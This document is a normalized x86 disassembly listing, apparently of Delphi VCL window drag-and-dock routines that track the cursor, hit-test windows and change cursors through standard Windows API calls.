mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_43ce2c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_417d38
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_417f10
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43cee4
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_417d6c
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_417e94
mov edx 0x8
call sub_4026fc
inc esi
dec ebx
jne r-xdata
sub_43cf18
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_417e94
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_43ce2c
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_43cf7c
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_43cfdc
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030bc
mov edx esp
mov eax esi
call sub_4041a4
add esp 0x100
pop esi
pop ebx
retn
sub_43d018
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d0e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_43e138
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43dac0
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406cd8
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_43dac0
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_43e138
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_43dac0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_43e138
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_43d0e7
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46040c
call sub_403974
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_43e138
sub_43d140
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43d16a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43d1d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43cf7c
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_43d1fc
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403368
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_43d228
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403368
xor edx edx
sub_43d280
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_448074
sub_43d2a0
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_44805c
sub_43d2c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43d1ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_422050
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_428a38
mov edx eax
mov eax esi
call sub_4221cc
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_43d328
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_40316c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_43d358
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43d1d0
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_43d3b4
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403368
pop edi
pop esi
pop ebp
retn 0x4
sub_43d3d8
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_43d3fc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43d3d8
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_43d3d8
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_43d4b8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_43d524
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_43d974
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_43ca3c
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_446450
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_446450
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_446450
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403368
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_43d4b8
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_446450
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_446450
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43d6bc
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_446450
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_446450
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_43d700
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_43cf18
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_43d524
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_417e94
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_446450
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43d6bc
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403368
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_444f80
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_43ce88
sub_43d85c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_417ef0
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_417d84
mov edx edi
mov eax [ rw-data ]
call sub_417d38
jmp r-xdata
sub_43d8bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_43d914
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404400
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43ca08
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_43d974
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_43d914
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_43d9a0
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_43d700
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_43d974
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43d8bc
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_446450
mov [ esi ] eax
sub_43d9f0
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43d8bc
cmp eax 0x1
sbb eax eax
inc eax
sub_43da2c
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_444eec
test eax eax
je r-xdata
mov eax esi
call sub_444eec
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43e45c
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_417e94
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_417ef0
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_444f00
mov edi eax
jmp r-xdata
sub_43dac0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_43d9a0
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_447f30
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_43d9f0
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_43d9f0
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_43f6f4
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_43d9f0
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_447eec
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43da2c
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_403368
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_448018
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_447f30
jmp r-xdata
mov eax [ rw-data ]
call sub_44808c
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_43f6f4
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_403368
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_403368
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407f78
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_43dd90
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_43cfbc
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_447f30
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_43dac0
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_43df00
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_43e0a5
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_403368
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_403368
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d2c4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_43dd90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43d1ac
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_446450
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
